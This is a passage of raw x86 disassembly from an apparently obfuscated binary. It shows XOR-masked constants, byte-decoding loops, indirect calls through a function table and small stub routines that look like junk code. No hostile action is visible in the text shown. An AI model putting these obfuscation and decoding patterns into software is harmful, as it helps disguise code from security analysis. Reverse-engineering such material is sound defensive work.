  424e57:	jb     0x424e36
  424e59:	mov    eax,DWORD PTR [ebp-0x3c]
  424e5c:	mov    DWORD PTR [ebp-0x28],eax
  424e5f:	mov    eax,DWORD PTR [ebp-0x2c]
  424e62:	mov    DWORD PTR [ebp-0x34],0xf89c85a5
  424e69:	mov    DWORD PTR [ebp-0xd4],eax
  424e6f:	mov    edi,0xf89c85a4
  424e74:	mov    DWORD PTR [ebp-0x30],edi
  424e77:	mov    eax,DWORD PTR [ebp-0x34]
  424e7a:	xor    eax,ebx
  424e7c:	add    eax,esi
  424e7e:	mov    DWORD PTR [ebp-0xc],eax
  424e81:	mov    eax,DWORD PTR [ebp-0x34]
  424e84:	xor    eax,ebx
  424e86:	add    eax,esi
  424e88:	mov    DWORD PTR [ebp-0x8],eax
  424e8b:	mov    DWORD PTR [ebp-0x44],0xf89c8585
  424e92:	mov    DWORD PTR [ebp-0x4c],0xf89c85be
  424e99:	mov    eax,DWORD PTR [ebp-0x34]
  424e9c:	mov    ecx,DWORD PTR [ebp-0x28]
  424e9f:	xor    eax,ebx
  424ea1:	add    eax,esi
  424ea3:	cmp    ecx,eax
  424ea5:	je     0x4250a4
  424eab:	jmp    0x425080
  424eb0:	mov    ecx,DWORD PTR [ebp-0xc]
  424eb3:	mov    eax,DWORD PTR [ebp-0x28]
  424eb6:	sub    eax,ecx
  424eb8:	mov    ecx,DWORD PTR [ebp-0x44]
  424ebb:	xor    ecx,ebx
  424ebd:	add    ecx,esi
  424ebf:	xor    edx,edx
  424ec1:	div    ecx
  424ec3:	mov    DWORD PTR [ebp-0x8],eax
  424ec6:	mov    eax,DWORD PTR [ebp-0x4c]
  424ec9:	mov    ecx,DWORD PTR [ebp-0x8]
  424ecc:	xor    eax,ebx
  424ece:	add    eax,esi
  424ed0:	cmp    ecx,eax
  424ed2:	jbe    0x424ede
  424ed4:	mov    eax,DWORD PTR [ebp-0x4c]
  424ed7:	xor    eax,ebx
  424ed9:	add    eax,esi
  424edb:	mov    DWORD PTR [ebp-0x8],eax
  424ede:	mov    eax,DWORD PTR [ebp-0x44]
  424ee1:	mov    ecx,DWORD PTR [ebp-0x8]
  424ee4:	xor    eax,ebx
  424ee6:	add    eax,esi
  424ee8:	imul   eax,ecx
  424eeb:	mov    DWORD PTR [ebp-0x8],eax
  424eee:	mov    eax,DWORD PTR [ebp-0x34]
  424ef1:	mov    ecx,DWORD PTR [ebp-0x8]
  424ef4:	xor    eax,ebx
  424ef6:	add    eax,esi
  424ef8:	cmp    ecx,eax
  424efa:	je     0x42506e
  424f00:	mov    eax,DWORD PTR [ebp-0x8]
  424f03:	mov    DWORD PTR [ebp-0x14],eax
  424f06:	mov    eax,DWORD PTR [ebp-0xc]
  424f09:	add    eax,DWORD PTR [ebp-0xd4]
  424f0f:	mov    DWORD PTR [ebp-0x24],0xf89c85a5
  424f16:	mov    DWORD PTR [ebp-0x20],edi
  424f19:	mov    DWORD PTR [ebp-0xe8],0xf89c85a3
  424f23:	mov    DWORD PTR [ebp-0x8],eax
  424f26:	mov    DWORD PTR [ebp-0x38],0xf89c85a2
  424f2d:	mov    DWORD PTR [ebp-0x1c],edi
  424f30:	mov    eax,DWORD PTR [ebp-0x24]
  424f33:	xor    eax,ebx
  424f35:	add    eax,esi
  424f37:	jmp    0x42502d
  424f3c:	mov    DWORD PTR [ebp-0xe0],0xf89c85ba
  424f46:	mov    DWORD PTR [ebp-0xc4],0xf89c858f
  424f50:	mov    eax,DWORD PTR [ebp-0x1c]
  424f53:	mov    ecx,DWORD PTR [ebp-0x48]
  424f56:	xor    eax,ebx
  424f58:	add    eax,esi
  424f5a:	imul   eax,ecx
  424f5d:	mov    ecx,DWORD PTR [ebp-0x8]
  424f60:	mov    al,BYTE PTR [eax+ecx*1]
  424f63:	mov    BYTE PTR [ebp-0x2],al
  424f66:	mov    eax,DWORD PTR [ebp-0x1c]
  424f69:	mov    ecx,DWORD PTR [ebp-0x48]
  424f6c:	xor    eax,ebx
  424f6e:	add    eax,esi
  424f70:	imul   eax,ecx
  424f73:	mov    ecx,DWORD PTR [ebp-0xe8]
  424f79:	xor    ecx,ebx
  424f7b:	add    eax,ecx
  424f7d:	mov    ecx,DWORD PTR [ebp-0x8]
  424f80:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f6]
  424f88:	mov    ecx,DWORD PTR [ebp-0xe0]
  424f8e:	xor    ecx,ebx
  424f90:	lea    eax,[ecx+eax*1+0x3272f6]
  424f97:	movzx  ecx,BYTE PTR [ebp-0x2]
  424f9b:	xor    ecx,eax
  424f9d:	mov    BYTE PTR [ebp-0x2],cl
  424fa0:	mov    al,BYTE PTR [ebp-0x2]
  424fa3:	mov    ecx,DWORD PTR [ebp-0x1c]
  424fa6:	mov    edx,DWORD PTR [ebp-0x48]
  424fa9:	xor    ecx,ebx
  424fab:	add    ecx,esi
  424fad:	imul   ecx,edx
  424fb0:	mov    edx,DWORD PTR [ebp-0x8]
  424fb3:	mov    BYTE PTR [ecx+edx*1],al
  424fb6:	mov    eax,DWORD PTR [ebp-0x1c]
  424fb9:	mov    ecx,DWORD PTR [ebp-0x48]
  424fbc:	xor    eax,ebx
  424fbe:	add    eax,esi
  424fc0:	imul   eax,ecx
  424fc3:	mov    ecx,DWORD PTR [ebp-0x8]
  424fc6:	mov    al,BYTE PTR [eax+ecx*1]
  424fc9:	mov    BYTE PTR [ebp-0x2],al
  424fcc:	mov    eax,DWORD PTR [ebp-0x1c]
  424fcf:	mov    ecx,DWORD PTR [ebp-0x48]
  424fd2:	xor    eax,ebx
  424fd4:	add    eax,esi
  424fd6:	imul   eax,ecx
  424fd9:	mov    ecx,DWORD PTR [ebp-0x20]
  424fdc:	xor    ecx,ebx
  424fde:	add    eax,ecx
  424fe0:	mov    ecx,DWORD PTR [ebp-0x8]
  424fe3:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f6]
  424feb:	mov    ecx,DWORD PTR [ebp-0xc4]
  424ff1:	xor    ecx,ebx
  424ff3:	lea    eax,[ecx+eax*1+0x3272f6]
  424ffa:	movzx  ecx,BYTE PTR [ebp-0x2]
  424ffe:	xor    ecx,eax
  425000:	mov    BYTE PTR [ebp-0x2],cl
  425003:	mov    al,BYTE PTR [ebp-0x2]
  425006:	mov    ecx,DWORD PTR [ebp-0x1c]
  425009:	mov    edx,DWORD PTR [ebp-0x48]
  42500c:	xor    ecx,ebx
  42500e:	add    ecx,esi
  425010:	imul   ecx,edx
  425013:	mov    edx,DWORD PTR [ebp-0x8]
  425016:	mov    BYTE PTR [ecx+edx*1],al
  425019:	mov    eax,DWORD PTR [ebp-0x38]
  42501c:	mov    ecx,DWORD PTR [ebp-0x20]
  42501f:	xor    eax,ebx
  425021:	xor    ecx,ebx
  425023:	add    eax,esi
  425025:	add    ecx,esi
  425027:	imul   eax,ecx
  42502a:	add    eax,DWORD PTR [ebp-0x48]
  42502d:	mov    DWORD PTR [ebp-0x48],eax
  425030:	mov    eax,DWORD PTR [ebp-0x48]
  425033:	mov    ecx,DWORD PTR [ebp-0x14]
  425036:	cmp    ecx,eax
  425038:	jb     0x424f3c
  42503e:	mov    eax,DWORD PTR [ebp-0x20]
  425041:	mov    ecx,DWORD PTR [ebp-0x14]
  425044:	xor    eax,ebx
  425046:	add    eax,esi
  425048:	imul   eax,ecx
  42504b:	mov    ecx,DWORD PTR [ebp-0x24]
  42504e:	xor    ecx,ebx
  425050:	add    ecx,esi
  425052:	or     eax,ecx
  425054:	mov    ecx,DWORD PTR [ebp-0x30]
  425057:	xor    ecx,ebx
  425059:	add    eax,ecx
  42505b:	mov    ecx,DWORD PTR [ebp-0x30]
  42505e:	xor    ecx,ebx
  425060:	add    eax,ecx
  425062:	mov    ecx,DWORD PTR [ebp-0xc]
  425065:	lea    eax,[eax+ecx*1+0x64e5ec]
  42506c:	jmp    0x42507d
  42506e:	mov    eax,DWORD PTR [ebp-0x30]
  425071:	mov    ecx,DWORD PTR [ebp-0xc]
  425074:	xor    eax,ebx
  425076:	lea    eax,[eax+ecx*1+0x3272f6]
  42507d:	mov    DWORD PTR [ebp-0xc],eax
  425080:	mov    eax,DWORD PTR [ebp-0x30]
  425083:	xor    eax,ebx
  425085:	mov    ecx,0xffcd8d0a
  42508a:	sub    ecx,eax
  42508c:	add    ecx,DWORD PTR [ebp-0x28]
  42508f:	mov    eax,DWORD PTR [ebp-0x30]
  425092:	mov    edx,DWORD PTR [ebp-0xc]
  425095:	xor    eax,ebx
  425097:	add    eax,esi
  425099:	imul   eax,edx
  42509c:	cmp    eax,ecx
  42509e:	jbe    0x424eb0
  4250a4:	mov    eax,DWORD PTR [ebp-0x10]
  4250a7:	mov    ecx,DWORD PTR [ebp-0x3c]
  4250aa:	mov    eax,DWORD PTR [ebp+0x8]
  4250ad:	mov    edx,DWORD PTR [ebp-0x54]
  4250b0:	mov    eax,DWORD PTR [eax+0x1e0]
  4250b6:	xor    edx,ebx
  4250b8:	add    edx,esi
  4250ba:	push   edx
  4250bb:	mov    edx,DWORD PTR [ebp-0x40]
  4250be:	xor    edx,ebx
  4250c0:	add    edx,esi
  4250c2:	push   edx
  4250c3:	push   ecx
  4250c4:	mov    DWORD PTR [ebp-0x38],ecx
  4250c7:	mov    ecx,DWORD PTR [ebp-0x10]
  4250ca:	xor    ecx,ebx
  4250cc:	add    ecx,esi
  4250ce:	push   ecx
  4250cf:	call   DWORD PTR [eax+0x14]
  4250d2:	mov    edi,eax
  4250d4:	mov    eax,DWORD PTR [ebp-0x10]
  4250d7:	xor    eax,ebx
  4250d9:	add    eax,esi
  4250db:	cmp    eax,edi
  4250dd:	je     0x425138
  4250df:	mov    eax,DWORD PTR [ebp-0x10]
  4250e2:	jmp    0x425105
  4250e4:	mov    ecx,DWORD PTR [ebp-0x2c]
  4250e7:	xor    eax,ebx
  4250e9:	mov    cl,BYTE PTR [ecx+eax*1+0x3272f6]
  4250f0:	mov    BYTE PTR [eax+edi*1+0x3272f6],cl
  4250f7:	mov    ecx,DWORD PTR [ebp-0x18]
  4250fa:	xor    ecx,ebx
  4250fc:	lea    eax,[ecx+eax*1+0x3272f6]
  425103:	xor    eax,ebx
  425105:	mov    ecx,DWORD PTR [ebp-0x3c]
  425108:	sub    ecx,esi
  42510a:	xor    ecx,ebx
  42510c:	cmp    eax,ecx
  42510e:	jne    0x4250e4
  425110:	mov    eax,DWORD PTR [ebp+0x8]
  425113:	mov    ecx,DWORD PTR [ebp-0x50]
  425116:	mov    eax,DWORD PTR [eax+0x1e0]
  42511c:	xor    ecx,ebx
  42511e:	add    ecx,esi
  425120:	push   ecx
  425121:	mov    ecx,DWORD PTR [ebp-0x10]
  425124:	xor    ecx,ebx
  425126:	add    ecx,esi
  425128:	push   ecx
  425129:	push   DWORD PTR [ebp-0x2c]
  42512c:	call   DWORD PTR [eax+0x18]
  42512f:	mov    eax,DWORD PTR [ebp-0x38]
  425132:	mov    DWORD PTR [ebp-0x2c],edi
  425135:	mov    DWORD PTR [ebp-0x3c],eax
  425138:	mov    eax,DWORD PTR [ebp-0x2c]
  42513b:	mov    DWORD PTR [ebp-0x14],eax
  42513e:	mov    eax,DWORD PTR [ebp-0x18]
  425141:	mov    ecx,DWORD PTR [ebp-0x10]
  425144:	xor    eax,ebx
  425146:	add    eax,esi
  425148:	mov    DWORD PTR [ebp-0x5c],0x422b332b
  42514f:	mov    DWORD PTR [ebp-0x58],0x382b402b
  425156:	jmp    0x425189
  425158:	mov    edx,DWORD PTR [ebp-0x14]
  42515b:	mov    edi,ecx
  42515d:	xor    edi,ebx
  42515f:	mov    cl,BYTE PTR [ebp+edi*1+0x32729a]
  425166:	movsx  edx,BYTE PTR [edi+edx*1+0x3272f6]
  42516e:	xor    cl,0x7f
  425171:	add    cl,0x4
  425174:	movzx  ecx,cl
  425177:	cmp    edx,ecx
  425179:	jne    0x425193
  42517b:	mov    ecx,DWORD PTR [ebp-0x18]
  42517e:	xor    ecx,ebx
  425180:	lea    ecx,[ecx+edi*1+0x3272f6]
  425187:	xor    ecx,ebx
  425189:	cmp    ecx,0xf89c85bd
  42518f:	jne    0x425158
  425191:	jmp    0x42519a
  425193:	mov    eax,DWORD PTR [ebp-0x10]
  425196:	xor    eax,ebx
  425198:	add    eax,esi
  42519a:	mov    ecx,DWORD PTR [ebp-0x10]
  42519d:	xor    ecx,ebx
  42519f:	add    ecx,esi
  4251a1:	cmp    ecx,eax
  4251a3:	je     0x425319
  4251a9:	mov    eax,DWORD PTR [ebp-0x14]
  4251ac:	mov    eax,DWORD PTR [eax+0x8]
  4251af:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  4251b6:	mov    DWORD PTR [ebp-0x40],0xf89cc3d6
  4251bd:	mov    DWORD PTR [ebp-0x44],0xf89cb5a5
  4251c4:	mov    DWORD PTR [ebp-0x24],0xf89c85a1
  4251cb:	mov    DWORD PTR [ebp-0x20],eax
  4251ce:	mov    eax,DWORD PTR [ebp+0x8]
  4251d1:	mov    ecx,DWORD PTR [ebp-0x24]
  4251d4:	xor    ecx,ebx
  4251d6:	add    ecx,esi
  4251d8:	push   ecx
  4251d9:	mov    ecx,DWORD PTR [ebp-0x44]
  4251dc:	mov    eax,DWORD PTR [eax+0x1e0]
  4251e2:	xor    ecx,ebx
  4251e4:	add    ecx,esi
  4251e6:	push   ecx
  4251e7:	mov    ecx,DWORD PTR [ebp-0x40]
  4251ea:	xor    ecx,ebx
  4251ec:	add    ecx,esi
  4251ee:	push   ecx
  4251ef:	mov    ecx,DWORD PTR [ebp-0xc]
  4251f2:	xor    ecx,ebx
  4251f4:	add    ecx,esi
  4251f6:	push   ecx
  4251f7:	call   DWORD PTR [eax+0x14]
  4251fa:	mov    edi,eax
  4251fc:	mov    eax,DWORD PTR [ebp+0x8]
  4251ff:	mov    ecx,DWORD PTR [ebp-0x24]
  425202:	mov    eax,DWORD PTR [eax+0x1e0]
  425208:	xor    ecx,ebx
  42520a:	add    ecx,esi
  42520c:	push   ecx
  42520d:	mov    ecx,DWORD PTR [ebp-0x44]
  425210:	xor    ecx,ebx
  425212:	add    ecx,esi
  425214:	push   ecx
  425215:	mov    ecx,DWORD PTR [ebp-0xc]
  425218:	push   DWORD PTR [ebp-0x20]
  42521b:	xor    ecx,ebx
  42521d:	add    ecx,esi
  42521f:	push   ecx
  425220:	call   DWORD PTR [eax+0x14]
  425223:	mov    ecx,DWORD PTR [ebp-0xc]
  425226:	xor    ecx,ebx
  425228:	add    ecx,esi
  42522a:	mov    DWORD PTR [ebp-0x24],eax
  42522d:	cmp    ecx,edi
  42522f:	je     0x4255bc
  425235:	mov    ecx,DWORD PTR [ebp-0xc]
  425238:	xor    ecx,ebx
  42523a:	add    ecx,esi
  42523c:	cmp    ecx,eax
  42523e:	je     0x4255bc
  425244:	mov    DWORD PTR [ebp-0x40],0xf89c85a2
  42524b:	mov    DWORD PTR [ebp-0x54],0xf89c85a3
  425252:	mov    ecx,DWORD PTR [ebp-0x40]
  425255:	xor    cl,0xaf
  425258:	sub    cl,0xa
  42525b:	mov    BYTE PTR [edi],cl
  42525d:	mov    ecx,DWORD PTR [ebp-0xc]
  425260:	xor    cl,0xaf
  425263:	sub    cl,0xa
  425266:	mov    BYTE PTR [edi+0x1],cl
  425269:	mov    ecx,DWORD PTR [ebp-0x54]
  42526c:	xor    cl,0xaf
  42526f:	sub    cl,0xa
  425272:	mov    BYTE PTR [edi+0x2],cl
  425275:	and    DWORD PTR [ebp-0xc8],0x0
  42527c:	and    DWORD PTR [ebp-0xdc],0x0
  425283:	lea    ecx,[ebp-0xdc]
  425289:	push   ecx
  42528a:	push   DWORD PTR [ebp-0x20]
  42528d:	push   eax
  42528e:	lea    eax,[ebp-0xc8]
  425294:	push   eax
  425295:	mov    eax,DWORD PTR [ebp-0x14]
  425298:	push   DWORD PTR [eax+0xc]
  42529b:	mov    eax,DWORD PTR [ebp-0x2c]
  42529e:	add    eax,0x10
  4252a1:	push   eax
  4252a2:	push   edi
  4252a3:	call   0x424547
  4252a8:	mov    DWORD PTR [ebp-0x40],eax
  4252ab:	mov    eax,DWORD PTR [ebp+0x8]
  4252ae:	mov    ecx,DWORD PTR [ebp-0x50]
  4252b1:	mov    eax,DWORD PTR [eax+0x1e0]
  4252b7:	xor    ecx,ebx
  4252b9:	add    ecx,esi
  4252bb:	push   ecx
  4252bc:	mov    ecx,DWORD PTR [ebp-0xc]
  4252bf:	xor    ecx,ebx
  4252c1:	add    ecx,esi
  4252c3:	push   ecx
  4252c4:	push   edi
  4252c5:	call   DWORD PTR [eax+0x18]
  4252c8:	mov    eax,DWORD PTR [ebp-0x40]
  4252cb:	add    eax,0xffcd8d0a
  4252d0:	xor    eax,ebx
  4252d2:	cmp    eax,0xf89c85a5
  4252d7:	mov    eax,DWORD PTR [ebp+0x8]
  4252da:	mov    eax,DWORD PTR [eax+0x1e0]
  4252e0:	mov    ecx,DWORD PTR [ebp-0x50]
  4252e3:	jne    0x425306
  4252e5:	xor    ecx,ebx
  4252e7:	add    ecx,esi
  4252e9:	push   ecx
  4252ea:	mov    ecx,DWORD PTR [ebp-0xc]
  4252ed:	xor    ecx,ebx
  4252ef:	add    ecx,esi
  4252f1:	push   ecx
  4252f2:	push   DWORD PTR [ebp-0x2c]
  4252f5:	call   DWORD PTR [eax+0x18]
  4252f8:	mov    eax,DWORD PTR [ebp-0x24]
  4252fb:	mov    DWORD PTR [ebp-0x2c],eax
  4252fe:	mov    eax,DWORD PTR [ebp-0x20]
  425301:	mov    DWORD PTR [ebp-0x3c],eax
  425304:	jmp    0x425319
  425306:	xor    ecx,ebx
  425308:	add    ecx,esi
  42530a:	push   ecx
  42530b:	mov    ecx,DWORD PTR [ebp-0xc]
  42530e:	xor    ecx,ebx
  425310:	add    ecx,esi
  425312:	push   ecx
  425313:	push   DWORD PTR [ebp-0x24]
  425316:	call   DWORD PTR [eax+0x18]
  425319:	mov    eax,DWORD PTR [ebp-0x3c]
  42531c:	mov    DWORD PTR [ebp-0x34],eax
  42531f:	mov    eax,DWORD PTR [ebp-0x2c]
  425322:	mov    DWORD PTR [ebp-0x28],0xf89c85a5
  425329:	mov    DWORD PTR [ebp-0x40],eax
  42532c:	mov    edi,0xf89c85a4
  425331:	mov    DWORD PTR [ebp-0x30],edi
  425334:	mov    eax,DWORD PTR [ebp-0x28]
  425337:	xor    eax,ebx
  425339:	add    eax,esi
  42533b:	mov    DWORD PTR [ebp-0xc],eax
  42533e:	mov    eax,DWORD PTR [ebp-0x28]
  425341:	xor    eax,ebx
  425343:	add    eax,esi
  425345:	mov    DWORD PTR [ebp-0x14],eax
  425348:	mov    DWORD PTR [ebp-0x44],0xf89c8585
  42534f:	mov    DWORD PTR [ebp-0x24],0xf89c85be
  425356:	mov    eax,DWORD PTR [ebp-0x28]
  425359:	mov    ecx,DWORD PTR [ebp-0x34]
  42535c:	xor    eax,ebx
  42535e:	add    eax,esi
  425360:	cmp    ecx,eax
  425362:	je     0x425558
  425368:	jmp    0x425534
  42536d:	mov    ecx,DWORD PTR [ebp-0xc]
  425370:	mov    eax,DWORD PTR [ebp-0x34]
  425373:	sub    eax,ecx
  425375:	mov    ecx,DWORD PTR [ebp-0x44]
  425378:	xor    ecx,ebx
  42537a:	add    ecx,esi
  42537c:	xor    edx,edx
  42537e:	div    ecx
  425380:	mov    DWORD PTR [ebp-0x14],eax
  425383:	mov    eax,DWORD PTR [ebp-0x24]
  425386:	mov    ecx,DWORD PTR [ebp-0x14]
  425389:	xor    eax,ebx
  42538b:	add    eax,esi
  42538d:	cmp    ecx,eax
  42538f:	jbe    0x42539b
  425391:	mov    eax,DWORD PTR [ebp-0x24]
  425394:	xor    eax,ebx
  425396:	add    eax,esi
  425398:	mov    DWORD PTR [ebp-0x14],eax
  42539b:	mov    eax,DWORD PTR [ebp-0x44]
  42539e:	mov    ecx,DWORD PTR [ebp-0x14]
  4253a1:	xor    eax,ebx
  4253a3:	add    eax,esi
  4253a5:	imul   eax,ecx
  4253a8:	mov    DWORD PTR [ebp-0x14],eax
  4253ab:	mov    eax,DWORD PTR [ebp-0x28]
  4253ae:	mov    ecx,DWORD PTR [ebp-0x14]
  4253b1:	xor    eax,ebx
  4253b3:	add    eax,esi
  4253b5:	cmp    ecx,eax
  4253b7:	je     0x425522
  4253bd:	mov    eax,DWORD PTR [ebp-0x14]
  4253c0:	mov    DWORD PTR [ebp-0x20],eax
  4253c3:	mov    eax,DWORD PTR [ebp-0xc]
  4253c6:	add    eax,DWORD PTR [ebp-0x40]
  4253c9:	mov    DWORD PTR [ebp-0x4c],0xf89c85a5
  4253d0:	mov    DWORD PTR [ebp-0x14],edi
  4253d3:	mov    DWORD PTR [ebp-0x54],0xf89c85a3
  4253da:	mov    DWORD PTR [ebp-0x1c],eax
  4253dd:	mov    DWORD PTR [ebp-0x38],0xf89c85a2
  4253e4:	mov    DWORD PTR [ebp-0x8],edi
  4253e7:	mov    eax,DWORD PTR [ebp-0x4c]
  4253ea:	xor    eax,ebx
  4253ec:	add    eax,esi
  4253ee:	jmp    0x4254e1
  4253f3:	mov    DWORD PTR [ebp-0xe4],0xf89c85ba
  4253fd:	mov    DWORD PTR [ebp-0xd0],0xf89c858f
  425407:	mov    eax,DWORD PTR [ebp-0x8]
  42540a:	mov    ecx,DWORD PTR [ebp-0x18]
  42540d:	xor    eax,ebx
  42540f:	add    eax,esi
  425411:	imul   eax,ecx
  425414:	mov    ecx,DWORD PTR [ebp-0x1c]
  425417:	mov    al,BYTE PTR [eax+ecx*1]
  42541a:	mov    BYTE PTR [ebp-0x1],al
  42541d:	mov    eax,DWORD PTR [ebp-0x8]
  425420:	mov    ecx,DWORD PTR [ebp-0x18]
  425423:	xor    eax,ebx
  425425:	add    eax,esi
  425427:	imul   eax,ecx
  42542a:	mov    ecx,DWORD PTR [ebp-0x54]
  42542d:	xor    ecx,ebx
  42542f:	add    eax,ecx
  425431:	mov    ecx,DWORD PTR [ebp-0x1c]
  425434:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f6]
  42543c:	mov    ecx,DWORD PTR [ebp-0xe4]
  425442:	xor    ecx,ebx
  425444:	lea    eax,[ecx+eax*1+0x3272f6]
  42544b:	movzx  ecx,BYTE PTR [ebp-0x1]
  42544f:	xor    ecx,eax
  425451:	mov    BYTE PTR [ebp-0x1],cl
  425454:	mov    al,BYTE PTR [ebp-0x1]
  425457:	mov    ecx,DWORD PTR [ebp-0x8]
  42545a:	mov    edx,DWORD PTR [ebp-0x18]
  42545d:	xor    ecx,ebx
  42545f:	add    ecx,esi
  425461:	imul   ecx,edx
  425464:	mov    edx,DWORD PTR [ebp-0x1c]
  425467:	mov    BYTE PTR [ecx+edx*1],al
  42546a:	mov    eax,DWORD PTR [ebp-0x8]
  42546d:	mov    ecx,DWORD PTR [ebp-0x18]
  425470:	xor    eax,ebx
  425472:	add    eax,esi
  425474:	imul   eax,ecx
  425477:	mov    ecx,DWORD PTR [ebp-0x1c]
  42547a:	mov    al,BYTE PTR [eax+ecx*1]
  42547d:	mov    BYTE PTR [ebp-0x1],al
  425480:	mov    eax,DWORD PTR [ebp-0x8]
  425483:	mov    ecx,DWORD PTR [ebp-0x18]
  425486:	xor    eax,ebx
  425488:	add    eax,esi
  42548a:	imul   eax,ecx
  42548d:	mov    ecx,DWORD PTR [ebp-0x14]
  425490:	xor    ecx,ebx
  425492:	add    eax,ecx
  425494:	mov    ecx,DWORD PTR [ebp-0x1c]
  425497:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f6]
  42549f:	mov    ecx,DWORD PTR [ebp-0xd0]
  4254a5:	xor    ecx,ebx
  4254a7:	lea    eax,[ecx+eax*1+0x3272f6]
  4254ae:	movzx  ecx,BYTE PTR [ebp-0x1]
  4254b2:	xor    ecx,eax
  4254b4:	mov    BYTE PTR [ebp-0x1],cl
  4254b7:	mov    al,BYTE PTR [ebp-0x1]
  4254ba:	mov    ecx,DWORD PTR [ebp-0x8]
  4254bd:	mov    edx,DWORD PTR [ebp-0x18]
  4254c0:	xor    ecx,ebx
  4254c2:	add    ecx,esi
  4254c4:	imul   ecx,edx
  4254c7:	mov    edx,DWORD PTR [ebp-0x1c]
  4254ca:	mov    BYTE PTR [ecx+edx*1],al
  4254cd:	mov    eax,DWORD PTR [ebp-0x38]
  4254d0:	mov    ecx,DWORD PTR [ebp-0x14]
  4254d3:	xor    eax,ebx
  4254d5:	xor    ecx,ebx
  4254d7:	add    eax,esi
  4254d9:	add    ecx,esi
  4254db:	imul   eax,ecx
  4254de:	add    eax,DWORD PTR [ebp-0x18]
  4254e1:	mov    DWORD PTR [ebp-0x18],eax
  4254e4:	mov    eax,DWORD PTR [ebp-0x18]
  4254e7:	mov    ecx,DWORD PTR [ebp-0x20]
  4254ea:	cmp    ecx,eax
  4254ec:	jb     0x4253f3
  4254f2:	mov    eax,DWORD PTR [ebp-0x14]
  4254f5:	mov    ecx,DWORD PTR [ebp-0x20]
  4254f8:	xor    eax,ebx
  4254fa:	add    eax,esi
  4254fc:	imul   eax,ecx
  4254ff:	mov    ecx,DWORD PTR [ebp-0x4c]
  425502:	xor    ecx,ebx
  425504:	add    ecx,esi
  425506:	or     eax,ecx
  425508:	mov    ecx,DWORD PTR [ebp-0x30]
  42550b:	xor    ecx,ebx
  42550d:	add    eax,ecx
  42550f:	mov    ecx,DWORD PTR [ebp-0x30]
  425512:	xor    ecx,ebx
  425514:	add    eax,ecx
  425516:	mov    ecx,DWORD PTR [ebp-0xc]
  425519:	lea    eax,[eax+ecx*1+0x64e5ec]
  425520:	jmp    0x425531
  425522:	mov    eax,DWORD PTR [ebp-0x30]
  425525:	mov    ecx,DWORD PTR [ebp-0xc]
  425528:	xor    eax,ebx
  42552a:	lea    eax,[eax+ecx*1+0x3272f6]
  425531:	mov    DWORD PTR [ebp-0xc],eax
  425534:	mov    eax,DWORD PTR [ebp-0x30]
  425537:	xor    eax,ebx
  425539:	mov    ecx,0xffcd8d0a
  42553e:	sub    ecx,eax
  425540:	add    ecx,DWORD PTR [ebp-0x34]
  425543:	mov    eax,DWORD PTR [ebp-0x30]
  425546:	mov    edx,DWORD PTR [ebp-0xc]
  425549:	xor    eax,ebx
  42554b:	add    eax,esi
  42554d:	imul   eax,edx
  425550:	cmp    eax,ecx
  425552:	jbe    0x42536d
  425558:	push   DWORD PTR [ebp+0x8]
  42555b:	mov    eax,DWORD PTR [ebp+0x8]
  42555e:	push   DWORD PTR [eax+0x1cc]
  425564:	lea    eax,[ebp-0xd8]
  42556a:	push   eax
  42556b:	mov    eax,DWORD PTR [ebp+0x8]
  42556e:	mov    eax,DWORD PTR [eax+0x1c4]
  425574:	push   DWORD PTR [eax]
  425576:	mov    eax,DWORD PTR [ebp+0x8]
  425579:	mov    eax,DWORD PTR [eax+0x1c0]
  42557f:	push   DWORD PTR [eax]
  425581:	push   DWORD PTR [ebp-0x3c]
  425584:	push   DWORD PTR [ebp-0x2c]
  425587:	call   0x42601e
  42558c:	mov    DWORD PTR [ebp-0x40],eax
  42558f:	mov    eax,DWORD PTR [ebp-0x10]
  425592:	mov    ecx,DWORD PTR [ebp-0x2c]
  425595:	xor    eax,ebx
  425597:	add    eax,esi
  425599:	cmp    eax,ecx
  42559b:	je     0x4255bc
  42559d:	mov    eax,DWORD PTR [ebp+0x8]
  4255a0:	mov    ecx,DWORD PTR [ebp-0x50]
  4255a3:	mov    eax,DWORD PTR [eax+0x1e0]
  4255a9:	xor    ecx,ebx
  4255ab:	add    ecx,esi
  4255ad:	push   ecx
  4255ae:	mov    ecx,DWORD PTR [ebp-0x10]
  4255b1:	xor    ecx,ebx
  4255b3:	add    ecx,esi
  4255b5:	push   ecx
  4255b6:	push   DWORD PTR [ebp-0x2c]
  4255b9:	call   DWORD PTR [eax+0x18]
  4255bc:	pop    edi
  4255bd:	pop    esi
  4255be:	pop    ebx
  4255bf:	leave  
  4255c0:	ret    0x4
  4255c3:	push   ebp
  4255c4:	mov    ebp,esp
  4255c6:	push   ecx
  4255c7:	push   ecx
  4255c8:	lea    eax,[ebp-0x8]
  4255cb:	mov    DWORD PTR [ebp-0x4],eax
  4255ce:	push   esi
  4255cf:	mov    esi,DWORD PTR [ebp-0x4]
  4255d2:	mov    eax,0xf881ba2f
  4255d7:	mov    DWORD PTR [esi],eax
  4255d9:	mov    esi,DWORD PTR [ebp-0x8]
  4255dc:	cmp    esi,eax
  4255de:	pop    esi
  4255df:	jne    0x4255e9
  4255e1:	mov    BYTE PTR [ecx+0xa],0x83
  4255e5:	mov    BYTE PTR [edx+0x8],0x30
  4255e9:	mov    BYTE PTR [edx+0xa],0x83
  4255ed:	mov    BYTE PTR [ecx+0x2],0x15
  4255f1:	leave  
  4255f2:	ret    
  4255f3:	push   ebp
  4255f4:	mov    ebp,esp
  4255f6:	push   ecx
  4255f7:	push   ecx
  4255f8:	lea    eax,[ebp-0x8]
  4255fb:	mov    DWORD PTR [ebp-0x4],eax
  4255fe:	mov    edx,DWORD PTR [ebp-0x4]
  425601:	mov    eax,0xf88b0bcb
  425606:	mov    DWORD PTR [edx],eax
  425608:	mov    edx,DWORD PTR [ebp-0x8]
  42560b:	cmp    edx,eax
  42560d:	jne    0x42561e
  42560f:	mov    eax,DWORD PTR [ebp+0x8]
  425612:	mov    BYTE PTR [ecx+0x9],0xf
  425616:	mov    BYTE PTR [eax+0x7],0x58
  42561a:	mov    BYTE PTR [ecx+0x6],0x10
  42561e:	mov    BYTE PTR [ecx+0x3],0x1f
  425622:	leave  
  425623:	ret    0x4
  425626:	push   ebp
  425627:	mov    ebp,esp
  425629:	push   ecx
  42562a:	push   ecx
  42562b:	lea    eax,[ebp-0x8]
  42562e:	mov    DWORD PTR [ebp-0x4],eax
